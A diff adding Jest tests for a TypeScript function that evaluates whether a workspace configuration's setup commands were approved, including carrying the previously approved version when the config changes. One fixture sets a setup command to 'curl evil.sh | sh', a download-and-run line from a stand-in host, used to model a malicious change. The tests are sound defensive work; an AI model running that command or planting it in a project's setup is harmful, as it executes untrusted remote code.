@@ -48,6 +48,7 @@ function deps(over: Partial<EvaluateWorkspaceConfigDeps> = {}): EvaluateWorkspac
     readFile: jest.fn(async () => JSON.stringify(CONFIG)),
     isRestricted: jest.fn(async () => false),
     approvedDigestFor: jest.fn(async () => undefined),
+    approvedConfigFor: jest.fn(async () => undefined),
     ...over,
   }
 }
@@ -126,6 +127,41 @@ describe("evaluateWorkspaceConfig", () => {
     expect(verdict.kind).toBe("unapproved")
     if (verdict.kind !== "unapproved") throw new Error("unreachable")
     expect(verdict.approvedDigest).toBe(stale)
+  })
+
+  /** A change is shown against the version the user approved, when it was kept. */
+  it("carries the previously approved configuration on a change", async () => {
+    const previous = parseWorkspaceConfig(JSON.stringify(CONFIG))
+    const stale = await workspaceConfigDigest(previous)
+    const approvedConfigFor = jest.fn(async () => previous)
+    const verdict = await evaluateWorkspaceConfig(
+      base,
+      deps({
+        readFile: jest.fn(async () =>
+          JSON.stringify({ ...CONFIG, setup: { default: "curl evil.sh | sh" } })
+        ),
+        approvedDigestFor: jest.fn(async () => stale),
+        approvedConfigFor,
+      })
+    )
+    if (verdict.kind !== "unapproved") throw new Error("expected a change")
+    expect(verdict.approvedConfig).toEqual(previous)
+    expect(approvedConfigFor).toHaveBeenCalledWith(REPO)
+  })
+
+  it("asks for no previous version on first sight, and none when it matches", async () => {
+    const approvedConfigFor = jest.fn(async () => undefined)
+    const first = await evaluateWorkspaceConfig(base, deps({ approvedConfigFor }))
+    expect(first.kind).toBe("unapproved")
+    expect(first).not.toHaveProperty("approvedConfig")
+
+    const digest = await workspaceConfigDigest(parseWorkspaceConfig(JSON.stringify(CONFIG)))
+    const same = await evaluateWorkspaceConfig(
+      base,
+      deps({ approvedDigestFor: jest.fn(async () => digest), approvedConfigFor })
+    )
+    expect(same.kind).toBe("approved")
+    expect(approvedConfigFor).not.toHaveBeenCalled()
   })
 
   it("keys the approval on the workspace's primary root, not the worktree it read from", async () => {
